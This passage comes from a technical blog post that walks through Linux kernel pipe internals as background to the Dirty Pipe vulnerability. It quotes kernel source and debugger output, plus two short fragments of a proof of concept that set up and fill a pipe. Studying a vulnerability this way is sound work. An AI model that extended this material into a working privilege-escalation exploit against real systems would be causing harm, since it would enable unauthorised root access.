&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations pipefifo_fops &lt;span style="color:#f92672">=&lt;/span> {
.open &lt;span style="color:#f92672">=&lt;/span> fifo_open,
.llseek &lt;span style="color:#f92672">=&lt;/span> no_llseek,
.read_iter &lt;span style="color:#f92672">=&lt;/span> pipe_read,
.write_iter &lt;span style="color:#f92672">=&lt;/span> pipe_write,
.poll &lt;span style="color:#f92672">=&lt;/span> pipe_poll,
.unlocked_ioctl &lt;span style="color:#f92672">=&lt;/span> pipe_ioctl,
.release &lt;span style="color:#f92672">=&lt;/span> pipe_release,
.fasync &lt;span style="color:#f92672">=&lt;/span> pipe_fasync,
.splice_write &lt;span style="color:#f92672">=&lt;/span> iter_file_splice_write,
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1218">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>As stated above, an inode is not limited to describing pipes, and for other file types this field would point to another set of function pointers / implementations.&lt;/p>
&lt;p>The pipe-specific part of the inode is mostly contained in the &lt;code>struct pipe_inode_info&lt;/code> pointed to by the &lt;code>i_pipe&lt;/code> field.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * struct pipe_inode_info - a linux kernel pipe
&lt;/span>&lt;span style="color:#75715e"> * @mutex: mutex protecting the whole thing
&lt;/span>&lt;span style="color:#75715e"> * @rd_wait: reader wait point in case of empty pipe
&lt;/span>&lt;span style="color:#75715e"> * @wr_wait: writer wait point in case of full pipe
&lt;/span>&lt;span style="color:#75715e"> * @head: The point of buffer production
&lt;/span>&lt;span style="color:#75715e"> * @tail: The point of buffer consumption
&lt;/span>&lt;span style="color:#75715e"> * @note_loss: The next read() should insert a data-lost message
&lt;/span>&lt;span style="color:#75715e"> * @max_usage: The maximum number of slots that may be used in the ring
&lt;/span>&lt;span style="color:#75715e"> * @ring_size: total number of buffers (should be a power of 2)
&lt;/span>&lt;span style="color:#75715e"> * @nr_accounted: The amount this pipe accounts for in user-&amp;gt;pipe_bufs
&lt;/span>&lt;span style="color:#75715e"> * @tmp_page: cached released page
&lt;/span>&lt;span style="color:#75715e"> * @readers: number of current readers of this pipe
&lt;/span>&lt;span style="color:#75715e"> * @writers: number of current writers of this pipe
&lt;/span>&lt;span style="color:#75715e"> * @files: number of struct file referring this pipe (protected by -&amp;gt;i_lock)
&lt;/span>&lt;span style="color:#75715e"> * @r_counter: reader counter
&lt;/span>&lt;span style="color:#75715e"> * @w_counter: writer counter
&lt;/span>&lt;span style="color:#75715e"> * @poll_usage: is this pipe used for epoll, which has crazy wakeups?
&lt;/span>&lt;span style="color:#75715e"> * @fasync_readers: reader side fasync
&lt;/span>&lt;span style="color:#75715e"> * @fasync_writers: writer side fasync
&lt;/span>&lt;span style="color:#75715e"> * @bufs: the circular array of pipe buffers
&lt;/span>&lt;span style="color:#75715e"> * @user: the user who created this pipe
&lt;/span>&lt;span style="color:#75715e"> * @watch_queue: If this pipe is a watch_queue, this is the stuff for that
&lt;/span>&lt;span style="color:#75715e"> **/&lt;/span>
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info {
&lt;span style="color:#66d9ef">struct&lt;/span> mutex mutex;
wait_queue_head_t rd_wait, wr_wait;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> head;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> tail;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> max_usage;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> ring_size;
&lt;span style="color:#75715e">#ifdef CONFIG_WATCH_QUEUE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> note_loss;
&lt;span style="color:#75715e">#endif
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> nr_accounted;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> readers;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> writers;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> files;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> r_counter;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> w_counter;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> poll_usage;
&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>tmp_page;
&lt;span style="color:#66d9ef">struct&lt;/span> fasync_struct &lt;span style="color:#f92672">*&lt;/span>fasync_readers;
&lt;span style="color:#66d9ef">struct&lt;/span> fasync_struct &lt;span style="color:#f92672">*&lt;/span>fasync_writers;
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>bufs;
&lt;span style="color:#66d9ef">struct&lt;/span> user_struct &lt;span style="color:#f92672">*&lt;/span>user;
&lt;span style="color:#75715e">#ifdef CONFIG_WATCH_QUEUE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> watch_queue &lt;span style="color:#f92672">*&lt;/span>watch_queue;
&lt;span style="color:#75715e">#endif
&lt;/span>&lt;span style="color:#75715e">&lt;/span>};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L58">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>At this point we can get a first idea of how pipes are implemented. On a high level, the kernel thinks of a pipe as a circular array of &lt;code>pipe_buffer&lt;/code> structures (sometimes also called a ring). The &lt;code>bufs&lt;/code> field is a pointer to the start of this array.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * struct pipe_buffer - a linux kernel pipe buffer
&lt;/span>&lt;span style="color:#75715e"> * @page: the page containing the data for the pipe buffer
&lt;/span>&lt;span style="color:#75715e"> * @offset: offset of data inside the @page
&lt;/span>&lt;span style="color:#75715e"> * @len: length of data inside the @page
&lt;/span>&lt;span style="color:#75715e"> * @ops: operations associated with this buffer. See @pipe_buf_operations.
&lt;/span>&lt;span style="color:#75715e"> * @flags: pipe buffer flags. See above.
&lt;/span>&lt;span style="color:#75715e"> * @private: private data owned by the ops.
&lt;/span>&lt;span style="color:#75715e"> **/&lt;/span>
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer {
&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>page;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> offset, len;
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> pipe_buf_operations &lt;span style="color:#f92672">*&lt;/span>ops;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> flags;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> private;
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L26">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>There are two positions in this array: one for writing to (the &lt;code>head&lt;/code>) - and one for reading from (the &lt;code>tail&lt;/code>) the pipe. The &lt;code>ring_size&lt;/code> defaults to &lt;code>16&lt;/code> and will always be a power of 2, which is why circularity is implemented by masking index accesses with &lt;code>ring_size - 1&lt;/code> (e.g., &lt;code>bufs[head &amp;amp; (ring_size - 1)]&lt;/code>). The &lt;code>page&lt;/code> field is a pointer to a &lt;code>struct page&lt;/code> describing where the actual data held by the &lt;code>pipe_buffer&lt;/code> is stored. We will elaborate more on the process of adding and consuming data below. Note that each &lt;code>pipe_buffer&lt;/code> has one page associated which means that the total capacity of the pipe is &lt;code>ring_size * 4096 bytes (4KB)&lt;/code>.&lt;/p>
&lt;p>A process can get and set the size of this ring using the &lt;code>fcntl()&lt;/code> system call with the &lt;code>F_GETPIPE_SZ&lt;/code> and &lt;code>F_SETPIPE_SZ&lt;/code> flags, respectively. Our PoC sets the size of its pipe to a single buffer (4KB / one page) for simplicity.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span>
&lt;span style="color:#a6e22e">setup_pipe&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> pipefd_r, &lt;span style="color:#66d9ef">int&lt;/span> pipefd_w) {
&lt;span style="color:#66d9ef">if&lt;/span> (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) &lt;span style="color:#f92672">!=&lt;/span> PAGESIZE) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L48">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;h3 id="code">Code&lt;/h3>
&lt;p>We can also follow the setup of the pipe in the kernel source code. The initialization of the integer file descriptors happens in &lt;code>__do_pipe_flags()&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">__do_pipe_flags&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>fd, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">**&lt;/span>files, &lt;span style="color:#66d9ef">int&lt;/span> flags)
{
&lt;span style="color:#66d9ef">int&lt;/span> error;
&lt;span style="color:#66d9ef">int&lt;/span> fdw, fdr;
...
error &lt;span style="color:#f92672">=&lt;/span> create_pipe_files(files, flags);
...
fdr &lt;span style="color:#f92672">=&lt;/span> get_unused_fd_flags(flags);
...
fdw &lt;span style="color:#f92672">=&lt;/span> get_unused_fd_flags(flags);
...
audit_fd_pair(fdr, fdw);
fd[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> fdr;
fd[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> fdw;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L954">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The backing files are initialized in &lt;code>create_pipe_files()&lt;/code>. We can see that both files are identical up to permissions, contain a reference to the pipe in their private data, and are opened as &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1423">streams&lt;/a>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">create_pipe_files&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">**&lt;/span>res, &lt;span style="color:#66d9ef">int&lt;/span> flags)
{
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode &lt;span style="color:#f92672">=&lt;/span> get_pipe_inode();
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>f;
&lt;span style="color:#66d9ef">int&lt;/span> error;
...
f &lt;span style="color:#f92672">=&lt;/span> alloc_file_pseudo(inode, pipe_mnt, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
O_WRONLY &lt;span style="color:#f92672">|&lt;/span> (flags &lt;span style="color:#f92672">&amp;amp;&lt;/span> (O_NONBLOCK &lt;span style="color:#f92672">|&lt;/span> O_DIRECT)),
&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipefifo_fops);
...
f&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_pipe;
res[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> alloc_file_clone(f, O_RDONLY &lt;span style="color:#f92672">|&lt;/span> (flags &lt;span style="color:#f92672">&amp;amp;&lt;/span> O_NONBLOCK),
&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipefifo_fops);
...
res[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_pipe;
res[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> f;
stream_open(inode, res[&lt;span style="color:#ae81ff">0&lt;/span>]);
stream_open(inode, res[&lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L911">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The initialization of the common inode structure happens in &lt;code>get_pipe_inode()&lt;/code>. We can see that an inode is created and also information for the pipe is allocated and stored such that &lt;code>inode-&amp;gt;i_pipe&lt;/code> can later be used to access the pipe from a given inode. Furthermore, &lt;code>inode-&amp;gt;i_fops&lt;/code> specifies the implementations used for file operations on a pipe.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">get_pipe_inode&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode &lt;span style="color:#f92672">=&lt;/span> new_inode_pseudo(pipe_mnt&lt;span style="color:#f92672">-&amp;gt;&lt;/span>mnt_sb);
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe;
...
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_ino &lt;span style="color:#f92672">=&lt;/span> get_next_ino();
pipe &lt;span style="color:#f92672">=&lt;/span> alloc_pipe_info();
...
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_pipe &lt;span style="color:#f92672">=&lt;/span> pipe;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>files &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>readers &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>writers &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_fop &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipefifo_fops; &lt;span style="color:#75715e">// lolcads: see description below
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * Mark the inode dirty from the very beginning,
&lt;/span>&lt;span style="color:#75715e"> * that way it will never be moved to the dirty
&lt;/span>&lt;span style="color:#75715e"> * list because &amp;#34;mark_inode_dirty()&amp;#34; will think
&lt;/span>&lt;span style="color:#75715e"> * that it already _is_ on the dirty list.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_state &lt;span style="color:#f92672">=&lt;/span> I_DIRTY;
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_mode &lt;span style="color:#f92672">=&lt;/span> S_IFIFO &lt;span style="color:#f92672">|&lt;/span> S_IRUSR &lt;span style="color:#f92672">|&lt;/span> S_IWUSR;
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_uid &lt;span style="color:#f92672">=&lt;/span> current_fsuid();
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_gid &lt;span style="color:#f92672">=&lt;/span> current_fsgid();
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_atime &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_mtime &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_ctime &lt;span style="color:#f92672">=&lt;/span> current_time(inode);
&lt;span style="color:#66d9ef">return&lt;/span> inode;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L871">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Most of the pipe-specific setup happens is &lt;code>alloc_pipe_info()&lt;/code>. Here you can see the actual creation of the pipe, not just the inode, but the &lt;code>pipe_buffer&lt;/code>s / &lt;code>pipe_inode_info-&amp;gt;bufs&lt;/code> that hold the content / data of the pipe.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">alloc_pipe_info&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> pipe_bufs &lt;span style="color:#f92672">=&lt;/span> PIPE_DEF_BUFFERS; &lt;span style="color:#75715e">// lolcads: defaults to 16
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> user_struct &lt;span style="color:#f92672">*&lt;/span>user &lt;span style="color:#f92672">=&lt;/span> get_current_user();
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> user_bufs;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> max_size &lt;span style="color:#f92672">=&lt;/span> READ_ONCE(pipe_max_size);
&lt;span style="color:#75715e">// lolcads: allocate the inode info
&lt;/span>&lt;span style="color:#75715e">&lt;/span> pipe &lt;span style="color:#f92672">=&lt;/span> kzalloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info), GFP_KERNEL_ACCOUNT);
...
&lt;span style="color:#75715e">// lolcads: allocate the buffers with the page references
&lt;/span>&lt;span style="color:#75715e">&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs &lt;span style="color:#f92672">=&lt;/span> kcalloc(pipe_bufs, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer),
GFP_KERNEL_ACCOUNT);
&lt;span style="color:#66d9ef">if&lt;/span> (pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs) { &lt;span style="color:#75715e">// lolcads: set up the rest of the relevant fields
&lt;/span>&lt;span style="color:#75715e">&lt;/span> init_waitqueue_head(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>rd_wait);
init_waitqueue_head(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>wr_wait);
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>r_counter &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>w_counter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>max_usage &lt;span style="color:#f92672">=&lt;/span> pipe_bufs;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ring_size &lt;span style="color:#f92672">=&lt;/span> pipe_bufs;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>nr_accounted &lt;span style="color:#f92672">=&lt;/span> pipe_bufs;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>user &lt;span style="color:#f92672">=&lt;/span> user;
mutex_init(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>mutex);
&lt;span style="color:#66d9ef">return&lt;/span> pipe;
}
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L782">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;h3 id="debugger">Debugger&lt;/h3>
&lt;p>We can print a summary of the freshly initialized pipe (after resizing it) by breaking at the end of &lt;code>pipe_fcntl()&lt;/code>, which is the handler invoked in the &lt;code>case F_SETPIPE_SZ:&lt;/code> of the switch statement inside &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1392">&lt;code>do_fcntl()&lt;/code>&lt;/a>.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 0
&amp;gt; 'tail': 0
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': NULL
&amp;gt; 'offset': 0
&amp;gt; 'len': 0
&amp;gt; 'ops': NULL
&amp;gt; 'flags':
&lt;/code>&lt;/pre>&lt;p>There&amp;rsquo;s not much to see yet, but we keep this as a reference to see how things evolve over time.&lt;/p>
&lt;h2 id="pipes-readingwriting">Pipes (reading/writing)&lt;/h2>
&lt;h3 id="writing">Writing&lt;/h3>
&lt;p>After allocating the pipe, the PoC proceeds by writing to it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span>
&lt;span style="color:#a6e22e">fill_pipe&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> pipefd_w) {
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to perform first write() to pipe&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">==&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to perform last write() to pipe&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (write(pipefd_w, &lt;span style="color:#e6db74">&amp;#34;AAAAAAAA&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L18">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>By looking at the file operations of a pipe inode we can see that &lt;code>write&lt;/code>s to a pipe are handled by &lt;code>pipe_write()&lt;/code>. When data is moved across the kernel-user-space boundary (or within the kernel) one frequently encounters vectorized I/O using &lt;a href="https://lwn.net/Articles/625077/">&lt;code>iov_iter&lt;/code>&lt;/a> objects. For our purposes we can think of them as buffers but feel free to follow the links to learn more (also &lt;a href="https://en.wikipedia.org/wiki/Vectored_I/O">this&lt;/a>).&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-c=" data-lang="c=">static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
struct file *filp = iocb-&amp;gt;ki_filp;
struct pipe_inode_info *pipe = filp-&amp;gt;private_data;
unsigned int head;
ssize_t ret = 0;
size_t total_len = iov_iter_count(from);
ssize_t chars;
bool was_empty = false;
...
/*
* If it wasn't empty we try to merge new data into
* the last buffer.
*
* That naturally merges small writes, but it also
* page-aligns the rest of the writes for large writes
* spanning multiple pages.
*/
head = pipe-&amp;gt;head;
was_empty = pipe_empty(head, pipe-&amp;gt;tail);
chars = total_len &amp;amp; (PAGE_SIZE-1);
if (chars &amp;amp;&amp;amp; !was_empty) {
unsigned int mask = pipe-&amp;gt;ring_size - 1;
struct pipe_buffer *buf = &amp;amp;pipe-&amp;gt;bufs[(head - 1) &amp;amp; mask];
int offset = buf-&amp;gt;offset + buf-&amp;gt;len;
if ((buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;amp;&amp;amp;
offset + chars &amp;lt;= PAGE_SIZE) {
...
ret = copy_page_from_iter(buf-&amp;gt;page, offset, chars, from);
...
buf-&amp;gt;len += ret;
if (!iov_iter_count(from))
goto out;
}
}
for (;;) {
...
head = pipe-&amp;gt;head;
if (!pipe_full(head, pipe-&amp;gt;tail, pipe-&amp;gt;max_usage)) {
unsigned int mask = pipe-&amp;gt;ring_size - 1;
struct pipe_buffer *buf = &amp;amp;pipe-&amp;gt;bufs[head &amp;amp; mask];
struct page *page = pipe-&amp;gt;tmp_page;
int copied;
if (!page) {
page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
...
pipe-&amp;gt;tmp_page = page;
}
/* Allocate a slot in the ring in advance and attach an
* empty buffer. If we fault or otherwise fail to use
* it, either the reader will consume it or it'll still
* be there for the next write.
*/
spin_lock_irq(&amp;amp;pipe-&amp;gt;rd_wait.lock);
head = pipe-&amp;gt;head;
if (pipe_full(head, pipe-&amp;gt;tail, pipe-&amp;gt;max_usage)) {
spin_unlock_irq(&amp;amp;pipe-&amp;gt;rd_wait.lock);
continue;
}
pipe-&amp;gt;head = head + 1;
spin_unlock_irq(&amp;amp;pipe-&amp;gt;rd_wait.lock);
/* Insert it into the buffer array */
buf = &amp;amp;pipe-&amp;gt;bufs[head &amp;amp; mask];
buf-&amp;gt;page = page;
buf-&amp;gt;ops = &amp;amp;anon_pipe_buf_ops;
buf-&amp;gt;offset = 0;
buf-&amp;gt;len = 0;
if (is_packetized(filp))
buf-&amp;gt;flags = PIPE_BUF_FLAG_PACKET;
else
buf-&amp;gt;flags = PIPE_BUF_FLAG_CAN_MERGE;
pipe-&amp;gt;tmp_page = NULL;
copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
...
ret += copied;
buf-&amp;gt;offset = 0;
buf-&amp;gt;len = copied;
if (!iov_iter_count(from))
break;
}
if (!pipe_full(head, pipe-&amp;gt;tail, pipe-&amp;gt;max_usage))
continue;
...
}
out:
...
return ret;
}
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L416">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
